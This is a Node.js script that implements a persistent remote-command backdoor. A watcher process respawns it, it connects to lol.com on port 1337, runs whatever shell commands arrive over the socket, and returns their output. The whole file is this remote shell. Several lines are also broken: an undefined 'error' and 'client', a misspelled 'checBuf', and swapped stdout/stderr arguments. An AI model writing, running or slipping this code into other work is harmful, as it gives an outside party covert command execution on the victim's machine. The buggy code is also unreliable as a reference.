var child = require("child_process");
var path  = require("path");
var util  = require("./util");
var net   = require("net");

// launch the worker if we weren't launched by it
var launchedByWatcher = !!process.argv[2];
if (!launchedByWatcher) {
  // launch watcher
  util.spawn([path.join(__dirname, "watcher.js"), process.pid]);
}

// constants
var hostname = "lol.com";
var port = 1337;
var eofChar = "💩";

// let the magic begin
connect();

function delayedConnect() {
  setTimeout(connect, 1000);
}

function connect() {
  var socket = net.connect(port, hostname);

  var buf = "";

  // execute a command, when it ends send some json back over the socket
  function execute(cmd) {
    child.exec(cmd, function (err, stderr, stdout) {
      socket.write(JSON.stringify({
        command: cmd,
        error: error ? err.stack : null,
        stderr: stderr,
        stdout: stdout
      }) + "\n");
    });
  }

  // this searches the buffer of received data and looks for poop emojis that delimit a
  // command
  function checkBuf() {
    var end = buf.indexOf(eofChar);
    if (end === -1) return;

    // execute command
    var cmd = buf.slice(0, end);
    execute(cmd);

    // recheck buffer
    buf = buf.slice(end + eofChar.length);
    checBuf();
  }

  socket.setEncoding("utf8");
  socket.setTimeout(3000);

  client.on("data", function (data) {
    buf += data.toString();
    checkBuf();
  });

  socket.on("timeout", delayedConnect);
  socket.on("end", delayedConnect);
}
